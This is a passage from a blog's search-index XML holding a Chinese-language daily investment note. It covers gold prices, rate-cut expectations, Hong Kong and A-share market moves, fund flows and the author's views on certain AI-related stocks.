title="总结"></a>总结</h4><p>国际市场上，近日美联储鸽派声音不断，降息临近，作为具有货币属性的贵金属正在进攻历史性高点，截至晚上八点，伦敦金已经突破了2440美元&#x2F;盎司，看继续走多头趋势。近日不断创下历史新高的各国股市的降息预期交易已经呈现出结束样态。港股市场在周五因美国CPI数据利好上涨后，连续两日下跌回补跳空缺口，跌至各日线均线以下，短期无法判断是技术性破位还是毛刺行情。今日中债长债早盘大幅跳水，A股应声上涨，但没有放量，午后国债价格又有所回升，股市诚意不足，短期趋势未见反转。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0716.png" srcset="/img/loading.gif" lazyload></p><h4 id="A股-186"><a href="#A股-186" class="headerlink" title="A股"></a>A股</h4><p>今日A股低开高走，主要风格为不涨大票涨小票，尤其以半导体、人工智能产业链涨势最佳。股指期货方向，上证50空升多降，而代表小票的中证1000却空降多升，小票行情可能与上周的停止转融券有关。今日最靓的仔当属寒武纪-U和紫光股份的涨停，但只有紫光股份有主力大量抢筹的现象，推测人工智能方向的行情持续性要更强。持有的浪潮信息、中科曙光两只股票已经突破所有均线，预计还有上升趋势，但受经济基本面影响，中期趋势并没有好转，近日逢高做减仓动作。</p><h4 id="资金-4"><a href="#资金-4" class="headerlink" title="资金"></a>资金</h4><p>今日港股下跌，但南向资金流入超60亿，看短期继续震荡。紫光股份主力流入超8亿，浪潮信息超5亿。两市成交量约6500亿。</p>]]></content>
    
    
    <categories>
      
      <category>金融</category>
      
    </categories>
    
    
    <tags>
      
      <tag>投资</tag>
      
      <tag>权益资产</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
